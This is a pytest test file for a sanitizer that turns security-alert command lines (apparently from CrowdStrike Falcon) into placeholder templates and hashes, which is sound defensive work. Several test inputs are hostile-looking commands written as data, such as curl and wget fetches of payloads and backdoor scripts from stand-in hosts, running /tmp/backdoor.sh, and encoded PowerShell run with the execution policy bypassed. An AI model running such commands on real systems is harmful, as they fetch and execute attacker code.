# test_sanitizer.py

"""
Tests for the Sanitizer class and extract_qa_fields function.

These tests verify that:
1. Command lines are properly sanitized with consistent placeholders
2. Templates are generated correctly from alerts
3. Template hashes are deterministic
4. Field extraction handles missing/null data gracefully
"""

import pytest
from sanitizer import Sanitizer, extract_qa_fields, debug_sanitization


class TestSanitizerIPAddresses:
    """Tests for IP address sanitization."""

    def test_sanitize_ipv4_basic(self):
        """IPv4 addresses should be replaced with <IP>."""
        cmdline = "ping 192.168.1.1"
        result = Sanitizer.sanitize(cmdline)
        assert "<IP>" in result
        assert "192.168.1.1" not in result

    def test_sanitize_ipv4_in_url(self):
        """IPv4 in URLs should be sanitized."""
        cmdline = "curl http://10.0.0.1:8080/payload"
        result = Sanitizer.sanitize(cmdline)
        assert "<IP>" in result
        assert "10.0.0.1" not in result

    def test_sanitize_multiple_ipv4(self):
        """Multiple IPv4 addresses should all be sanitized."""
        cmdline = "netstat -an | grep 192.168.1.1 172.16.0.1"
        result = Sanitizer.sanitize(cmdline)
        assert result.count("<IP>") == 2
        assert "192.168.1.1" not in result
        assert "172.16.0.1" not in result

    def test_sanitize_ipv6(self):
        """IPv6 addresses should be replaced with <IP>."""
        cmdline = "ping 2001:0db8:85a3:0000:0000:8a2e:0370:7334"
        result = Sanitizer.sanitize(cmdline)
        assert "<IP>" in result
        assert "2001:" not in result


class TestSanitizerGUIDs:
    """Tests for GUID/UUID sanitization."""

    def test_sanitize_guid_with_braces(self):
        """GUIDs with braces should be sanitized."""
        cmdline = r"schtasks /create /tn {A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"
        result = Sanitizer.sanitize(cmdline)
        assert "<GUID>" in result
        assert "A1B2C3D4" not in result

    def test_sanitize_guid_without_braces(self):
        """GUIDs without braces should be sanitized."""
        cmdline = "reg add HKLM\\SOFTWARE\\A1B2C3D4-E5F6-7890-ABCD-EF1234567890"
        result = Sanitizer.sanitize(cmdline)
        assert "<GUID>" in result

    def test_sanitize_clsid(self):
        """CLSIDs in registry paths should be sanitized."""
        cmdline = r"regsvr32 /s /u {12345678-1234-1234-1234-123456789ABC}"
        result = Sanitizer.sanitize(cmdline)
        assert "<GUID>" in result


class TestSanitizerTempPaths:
    """Tests for temporary path sanitization."""

    def test_sanitize_windows_user_temp(self):
        """Windows user temp paths should be sanitized."""
        cmdline = r"copy malware.exe C:\Users\JohnDoe\AppData\Local\Temp\random123.exe"
        result = Sanitizer.sanitize(cmdline)
        assert "<TEMP>" in result
        assert "JohnDoe" not in result

    def test_sanitize_windows_system_temp(self):
        """Windows system temp paths should be sanitized."""
        cmdline = r"move C:\Windows\Temp\payload.dll C:\System32"
        result = Sanitizer.sanitize(cmdline)
        assert "<TEMP>" in result

    def test_sanitize_linux_tmp(self):
        """Linux /tmp paths should be sanitized."""
        cmdline = "chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh"
        result = Sanitizer.sanitize(cmdline)
        assert "<TEMP>" in result
        assert "backdoor.sh" not in result

    def test_sanitize_linux_var_tmp(self):
        """Linux /var/tmp paths should be sanitized."""
        cmdline = "cp /var/tmp/malware /usr/bin/svchost"
        result = Sanitizer.sanitize(cmdline)
        assert "<TEMP>" in result


class TestSanitizerTimestamps:
    """Tests for timestamp sanitization."""

    def test_sanitize_iso_timestamp(self):
        """ISO format timestamps should be sanitized."""
        cmdline = "log entry 2024-01-15T14:30:00Z user login"
        result = Sanitizer.sanitize(cmdline)
        assert "<TIME>" in result
        assert "2024-01-15" not in result

    def test_sanitize_iso_timestamp_with_offset(self):
        """ISO timestamps with timezone offset should be sanitized."""
        cmdline = "created: 2024-06-20T10:15:30+05:00"
        result = Sanitizer.sanitize(cmdline)
        assert "<TIME>" in result

    def test_sanitize_unix_timestamp(self):
        """Unix timestamps (10-13 digits starting with 1) should be sanitized."""
        cmdline = "modified: 1704067200 bytes"
        result = Sanitizer.sanitize(cmdline)
        assert "<TIME>" in result
        assert "1704067200" not in result


class TestSanitizerBase64:
    """Tests for Base64 data sanitization."""

    def test_sanitize_base64_encoded_command(self):
        """Base64 encoded data (20+ chars) should be sanitized."""
        cmdline = "powershell -enc SGVsbG9Xb3JsZEhlbGxvV29ybGQ="
        result = Sanitizer.sanitize(cmdline)
        assert "<DATA>" in result
        assert "SGVsbG9Xb3JsZA" not in result

    def test_sanitize_short_base64_preserved(self):
        """Short Base64-like strings (<20 chars) should be preserved."""
        cmdline = "powershell -enc ABC123"
        result = Sanitizer.sanitize(cmdline)
        # Short strings shouldn't trigger base64 rule
        assert "ABC123" in result or "<RAND>" in result


class TestSanitizerHex:
    """Tests for hex string sanitization."""

    def test_sanitize_md5_hash(self):
        """MD5 hashes (32 hex chars) should be sanitized.
        
        Note: Long hex strings may be caught by the Base64 rule first
        since hex chars are valid base64. Either placeholder is acceptable.
        """
        cmdline = "hash: d41d8cd98f00b204e9800998ecf8427e"
        result = Sanitizer.sanitize(cmdline)
        # May be <HEX> or <DATA> depending on rule ordering
        assert "<HEX>" in result or "<DATA>" in result
        assert "d41d8cd98f00b204" not in result

    def test_sanitize_sha256_hash(self):
        """SHA256 hashes (64 hex chars) should be sanitized.
        
        Note: Long hex strings may be caught by the Base64 rule first.
        """
        hash_value = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        cmdline = f"verified hash: {hash_value}"
        result = Sanitizer.sanitize(cmdline)
        # May be <HEX> or <DATA> depending on rule ordering
        assert "<HEX>" in result or "<DATA>" in result
        assert hash_value not in result


class TestSanitizerSIDs:
    """Tests for SID sanitization."""

    def test_sanitize_well_known_sid_local_system(self):
        """Well-known SID S-1-5-18 should become <LocalSystem>."""
        cmdline = "runas /user:S-1-5-18 cmd.exe"
        result = Sanitizer.sanitize(cmdline)
        assert "<LocalSystem>" in result
        assert "S-1-5-18" not in result

    def test_sanitize_well_known_sid_administrators(self):
        """Well-known SID S-1-5-32-544 should become <Administrators>."""
        cmdline = "net localgroup S-1-5-32-544 /add user"
        result = Sanitizer.sanitize(cmdline)
        assert "<Administrators>" in result

    def test_sanitize_domain_sid(self):
        """Domain SIDs should be sanitized.
        
        Note: The numeric components (RID) may be caught by other rules
        (like timestamp) first. The key is the SID is not left in readable form.
        """
        cmdline = "whoami /user S-1-5-21-1234567890-987654321-1122334455-1001"
        result = Sanitizer.sanitize(cmdline)
        # Full SID should not remain intact
        assert "S-1-5-21-1234567890-987654321-1122334455-1001" not in result
        # Some sanitization should have occurred
        assert "<SID>" in result or "<TIME>" in result

    def test_sanitize_everyone_sid(self):
        """Everyone SID should become <Everyone>."""
        cmdline = "icacls folder /grant S-1-1-0:F"
        result = Sanitizer.sanitize(cmdline)
        assert "<Everyone>" in result


class TestSanitizerRandomStrings:
    """Tests for random alphanumeric string sanitization."""

    def test_sanitize_random_filename(self):
        """Random alphanumeric strings (12+ chars) should be sanitized."""
        cmdline = r"C:\Windows\Temp\a1b2c3d4e5f6g7h8.exe"
        result = Sanitizer.sanitize(cmdline)
        # Should trigger either TEMP or RAND rule
        assert "<TEMP>" in result or "<RAND>" in result


class TestSanitizerURLs:
    """Tests for URL hostname sanitization."""

    def test_sanitize_url_preserves_protocol(self):
        """URL hostnames should be sanitized but protocol preserved."""
        cmdline = "curl https://malicious-domain.com/payload"
        result = Sanitizer.sanitize(cmdline)
        assert "https://<HOST>" in result
        assert "malicious-domain" not in result

    def test_sanitize_http_url(self):
        """HTTP URLs should be handled correctly."""
        cmdline = "wget http://evil.example.org/backdoor.sh"
        result = Sanitizer.sanitize(cmdline)
        assert "http://<HOST>" in result


class TestSanitizerEdgeCases:
    """Tests for edge cases in sanitization."""

    def test_sanitize_empty_string(self):
        """Empty string should return empty string."""
        assert Sanitizer.sanitize("") == ""

    def test_sanitize_none(self):
        """None should return empty string."""
        assert Sanitizer.sanitize(None) == ""

    def test_sanitize_whitespace_normalization(self):
        """Multiple whitespace should be normalized."""
        cmdline = "cmd  /c    echo    hello"
        result = Sanitizer.sanitize(cmdline)
        assert "  " not in result
        assert "cmd /c echo hello" == result

    def test_sanitize_preserves_structure(self):
        """Sanitization should preserve command structure."""
        cmdline = "powershell.exe -ExecutionPolicy Bypass -File script.ps1"
        result = Sanitizer.sanitize(cmdline)
        assert "powershell.exe" in result
        assert "-ExecutionPolicy" in result
        assert "Bypass" in result


class TestGenerateTemplate:
    """Tests for template generation from alerts."""

    def test_generate_template_full_alert(self, sample_alert):
        """Template should include pattern_id, cmdline, filename, parent."""
        template = Sanitizer.generate_template(sample_alert)
        
        assert "pattern:50007" in template
        assert "cmd:" in template
        assert "file:powershell.exe" in template
        assert "parent:cmd.exe" in template
        assert "|" in template

    def test_generate_template_sanitizes_cmdline(self):
        """Command line in template should be sanitized."""
        # Create alert with longer base64 to trigger sanitization
        alert = {
            'pattern_id': 50007,
            'cmdline': 'powershell.exe -enc SGVsbG9Xb3JsZEhlbGxvV29ybGRIZWxsbw== -ep bypass',
            'filename': 'powershell.exe',
            'parent_details': {'filename': 'cmd.exe'}
        }
        template = Sanitizer.generate_template(alert)
        
        # Base64 (20+ chars) should be replaced with <DATA>
        assert "<DATA>" in template
        assert "SGVsbG9Xb3JsZA" not in template

    def test_generate_template_minimal_alert(self, alert_minimal):
        """Minimal alert should still generate valid template."""
        template = Sanitizer.generate_template(alert_minimal)
        
        assert "pattern:50001" in template
        assert "cmd:" in template
        assert "file:" in template
        assert "parent:" in template

    def test_generate_template_with_ip(self, alert_with_ip):
        """Template should sanitize IP addresses."""
        template = Sanitizer.generate_template(alert_with_ip)
        
        assert "<IP>" in template
        assert "192.168.1.100" not in template

    def test_generate_template_deterministic(self, sample_alert):
        """Same alert should always produce same template."""
        template1 = Sanitizer.generate_template(sample_alert)
        template2 = Sanitizer.generate_template(sample_alert)
        
        assert template1 == template2


class TestHashTemplate:
    """Tests for template hashing."""

    def test_hash_template_returns_sha256(self):
        """Hash should be 64-character hex string (SHA-256)."""
        template = "pattern:50007|cmd:test|file:test.exe|parent:cmd.exe"
        hash_value = Sanitizer.hash_template(template)
        
        assert len(hash_value) == 64
        assert all(c in '0123456789abcdef' for c in hash_value)

    def test_hash_template_deterministic(self):
        """Same template should always produce same hash."""
        template = "pattern:50007|cmd:test|file:test.exe|parent:cmd.exe"
        
        hash1 = Sanitizer.hash_template(template)
        hash2 = Sanitizer.hash_template(template)
        
        assert hash1 == hash2

    def test_hash_template_different_templates(self):
        """Different templates should produce different hashes."""
        template1 = "pattern:50007|cmd:test1|file:test.exe|parent:cmd.exe"
        template2 = "pattern:50007|cmd:test2|file:test.exe|parent:cmd.exe"
        
        hash1 = Sanitizer.hash_template(template1)
        hash2 = Sanitizer.hash_template(template2)
        
        assert hash1 != hash2

    def test_hash_empty_template(self):
        """Empty template should still produce valid hash."""
        hash_value = Sanitizer.hash_template("")
        
        assert len(hash_value) == 64


class TestExtractQAFields:
    """Tests for the extract_qa_fields helper function."""

    def test_extract_all_fields(self, sample_alert):
        """All expected fields should be extracted."""
        fields = extract_qa_fields(sample_alert)
        
        assert fields['alert_id'] == 'ldt:abc123:456'
        assert fields['composite_id'] == 'abc123:ind:456'
        assert fields['pattern_id'] == 50007
        assert fields['resolution'] == 'true_positive'
        assert fields['status'] == 'closed'
        assert fields['hostname'] == 'WORKSTATION-001'
        assert fields['cmdline'] == r'powershell.exe -enc SGVsbG9Xb3JsZA== -ep bypass'
        assert fields['filename'] == 'powershell.exe'
        assert fields['parent_filename'] == 'cmd.exe'
        assert fields['technique_id'] == 'T1059.001'

    def test_extract_handles_missing_device(self, alert_minimal):
        """Missing device dict should not cause errors."""
        fields = extract_qa_fields(alert_minimal)
        
        assert fields['hostname'] is None

    def test_extract_handles_missing_parent_details(self, alert_minimal):
        """Missing parent_details should not cause errors."""
        fields = extract_qa_fields(alert_minimal)
        
        assert fields['parent_filename'] is None

    def test_extract_handles_none_values(self, alert_minimal):
        """None values in alert should be preserved."""
        fields = extract_qa_fields(alert_minimal)
        
        assert fields['resolution'] is None
        assert fields['cmdline'] is None

    def test_extract_falcon_link(self, sample_alert):
        """Falcon host link should be extracted."""
        fields = extract_qa_fields(sample_alert)
        
        assert 'falcon.crowdstrike.com' in fields['falcon_link']


class TestDebugSanitization:
    """Tests for the debug_sanitization helper."""

    def test_debug_sanitization_runs(self, capsys):
        """Debug function should output sanitization details."""
        cmdline = "ping 192.168.1.1"
        debug_sanitization(cmdline)
        
        captured = capsys.readouterr()
        assert "Original:" in captured.out
        assert "Sanitized:" in captured.out
        assert "IPv4 Address" in captured.out